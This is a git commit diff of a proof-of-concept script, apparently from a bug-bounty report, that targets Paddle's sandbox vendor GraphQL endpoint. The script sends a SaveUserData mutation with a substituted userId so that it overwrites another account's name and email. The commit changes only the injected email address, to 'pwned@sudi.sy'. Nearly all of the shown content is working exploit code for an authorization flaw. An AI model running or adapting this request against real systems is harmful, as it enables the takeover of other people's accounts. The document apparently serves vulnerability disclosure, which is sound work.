908a3dc690edc6fbb71148ea31834551aee7c04f
Sudhanshu Rajbhar <31372554+Sudistark@users.noreply.github.com>
2025-07-07 08:09:38 +0530

    Update pdl-poc.js

--- tmp/pdl-poc.js
+++ tmp/pdl-poc.js
@@ -6,6 +6,6 @@ fetch("https://sandbox-vendors.paddle.com/graphql", {
     "headers": {
         "content-type": "application/json",
     },
-    "body": "{\"operationName\":\"SaveUserData\",\"variables\":{\"userId\":1337,\"firstName\":\"zzzz\",\"lastName\":\"xxxs\",\"email\":\"nidayec351@dxirl.com\"},\"query\":\"mutation SaveUserData($userId: Int!, $firstName: String!, $lastName: String!, $email: String!, $previousPassword: String, $newPassword: String, $newPasswordRepeat: String) {\\n  saveUserData(\\n    userId: $userId\\n    firstName: $firstName\\n    lastName: $lastName\\n    email: $email\\n    previousPassword: $previousPassword\\n    newPassword: $newPassword\\n    newPasswordRepeat: $newPasswordRepeat\\n  ) {\\n    success\\n    __typename\\n  }\\n}\"}".replace(1337,userId),
+    "body": "{\"operationName\":\"SaveUserData\",\"variables\":{\"userId\":1337,\"firstName\":\"zzzz\",\"lastName\":\"xxxs\",\"email\":\"pwned@sudi.sy\"},\"query\":\"mutation SaveUserData($userId: Int!, $firstName: String!, $lastName: String!, $email: String!, $previousPassword: String, $newPassword: String, $newPasswordRepeat: String) {\\n  saveUserData(\\n    userId: $userId\\n    firstName: $firstName\\n    lastName: $lastName\\n    email: $email\\n    previousPassword: $previousPassword\\n    newPassword: $newPassword\\n    newPasswordRepeat: $newPasswordRepeat\\n  ) {\\n    success\\n    __typename\\n  }\\n}\"}".replace(1337,userId),
     "method": "POST",
 });
